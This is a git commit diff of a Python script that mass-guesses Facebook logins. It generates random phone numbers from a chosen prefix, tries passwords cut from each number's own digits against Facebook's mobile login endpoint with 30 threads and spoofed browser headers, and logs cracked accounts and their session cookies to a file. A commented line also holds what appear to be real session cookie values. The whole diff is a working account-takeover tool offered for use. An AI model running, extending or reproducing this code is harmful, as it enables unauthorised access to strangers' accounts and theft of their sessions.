69be9c3f5995026d93550cb735ad17f21617bed1
SIAM-AHMED-CP <118670054+SIAM-AHMED-CP@users.noreply.github.com>
2023-01-01 15:37:14 +0600

    Add files via upload

--- 1818.py
+++ 1818.py
@@ -1,5 +1,5 @@
 import requests as r
-import re, time,random,os,string
+import re, time,random,os,string,sys
 from concurrent.futures import ThreadPoolExecutor as tdp
 
 ugen =['Mozilla/5.0 (Linux; Android 8.1.0; V1818A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36','Mozilla/5.0 (Linux; arm_64; Android 8.1.0; CPH1903) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.111.1 YaSearchBrowser/21.111.1 BroPP/1.0 SA/3 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; LM-Q710(FGN) Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 GoogleApp/12.44.23.23.arm',"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.9.0.1"]
@@ -11,12 +11,17 @@ ugen =['Mozilla/5.0 (Linux; Android 8.1.0; V1818A) AppleWebKit/537.36 (KHTML, li
 n=0
 ok=0
 cp=0
-def c(e,p):
-    global n,cp,ok
-    print(f"\033[1;32mCHECKED-{n} |CP-{cp} | OK-{ok} [{e}-{p}]\033[0m",end="\r")
+def c(e,pw):
+  global n,cp,ok
+  sys.stdout.write(f"\r\033[1;32mCHECKED-{n} |CP-{cp} | OK-{ok}\033[0m")
+  sys.stdout.flush()
+  status=0
+  for p in pw:
+     
+    print(f"for {e}-{p}")
     s=r.Session()
     s.headers.update({'User-Agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'})
-    fb=s.get("https://m.facebook.com")
+    fb=s.get("https://d.facebook.com")
     c1=";".join(k+"="+v for k,v in dict(s.cookies).items())
     #print(s.headers)
     #print(c1)
@@ -24,9 +29,9 @@ def c(e,p):
         'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
     }
     s.headers.update(hd1)
-    rt=s.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
+    rt=s.get("https://d.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
     rs=rt.text
-    open("/sdcard/e.html","w").write(rs)
+    #open("/sdcard/e.html","w").write(rs)
     #print(rt)
     d= {
             "lsd":re.search('name="lsd" value="(.*?)"', str(rs)).group(1),
@@ -41,7 +46,7 @@ def c(e,p):
            "login":"Log In"
           }
     hd={
-"authority": "m.facebook.com",
+"authority": "d.facebook.com",
 "method": "POST",
 #"path": "/?tbua=1",
 "scheme": "https",
@@ -50,7 +55,7 @@ def c(e,p):
 "accept-language": "en-US,en;q=0.9",
 "cache-control": "max-age=0",
 #cookie: sb=ZZSmY3MeGBoUQGwRYUyxoK8S; datr=ZZSmYxVfXZE4d7ZeITyN1zZn; c_user=100088418937096; xs=33%3AJzMFYMhAzYX4jg%3A2%3A1671861496%3A-1%3A-1; fr=00aIcvweHilBtCkt0.AWVfy_UWaaZSxYEBpHqAs3leHj4.BjppRl.aS.AAA.0.0.BjppT6.AWXrK0CmeIw; presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1671861507032%2C%22v%22%3A1%7D; m_page_voice=100088418937096; m_pixel_ratio=1; wd=971x620
-"referer": "https://m.facebook.com/",
+"referer": "https://d.facebook.com/",
 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
 "sec-ch-ua-mobile": "?0",
 'sec-ch-ua-platform': '"Windows"',
@@ -63,13 +68,12 @@ def c(e,p):
 }
     def sub():
         global cp,ok
-
-        while True:
-            try:
-                x=s.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8",data=d,headers=hd
+        nonlocal status
+        try:
+                x=s.post("https://d.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8",data=d,headers=hd
               
                 ).text
-                #print(x)
+            
                 #open("/sdcard/e.html","w").write(x)
                 #print(s.cookies)
                 dc=dict(s.cookies)
@@ -80,28 +84,36 @@ def c(e,p):
                 
                 #print(s.cookies)
                 x=str(s.cookies)
-                
+                #print(f"Running {e} {p}")
                 if "checkpoint" in x:
                     cp+=1
                     cv=dc["checkpoint"][13:28]
-                    print(f"\u001b[1;36mCp\t{e}-{cv}- {p}\u001b[0m\n\n")
-                    
-                    print("\u001b[1;94m"+coki)
+                    print(f"\u001b[1;36mCP\n{e}-{cv} - {p}\u001b[0m")
+                    print("\u001b[1;94m"+coki+"\u001b[0m\n\n")
                     open("sp.txt","a").write(f"{e} {cv} {p}\n")
+                    status=1
+                    
+                    
                 elif "c_user" in x:
                     ok+=1
                     cv=dc["c_user"]
-                    print(f"\u001b[1;32mOk {e}-{cv} - {p}\u001b[0m\n\n")
-                    print("\u001b[1;94m"+coki)
+                    print(f"\u001b[1;32mOk\n{e}-{cv} - {p}\u001b[0m")
+                    print("\u001b[1;94m"+coki+"\u001b[0m\n\n")
                     open("sp.txt","a").write(f"{e} {cv} {p} -OK\n")
-            except Exception as er:
+                    status=1
+                    
+        except Exception as er:
                 print(er)
                 print("\n"*3)
+                time.sleep(15)
                 sub()
-            break
+        
     sub()
-    n+=1
-
+    if status==1:
+        break
+  n+=1
+  
+  
 #API- method
 
 
@@ -158,17 +170,19 @@ codes=[300, 301, 302, 303, 304, 305, 306, 307, 308, 309,310, 311, 312, 313, 314,
 code=input("Code(0305,0303,0345):")
 #305#random.choice(codes)
 lim=int(input("Limit:"))
+pslen=int(input("Password Length (6-11):"))
 nums=[]
 for i in range(lim):
     nums.append(f"{code}{''.join(random.choice(string.digits) for _ in range(7))}")
-print(nums)
+#print(nums)
 
 
 
             
 with tdp(max_workers=30) as t:
     for i in nums:
-        t.submit(n,i,i[4:])
+        pws=[i[(11-n):] for n in range(6,pslen+1)]
+        t.submit(c,i,pws)
 
 
 
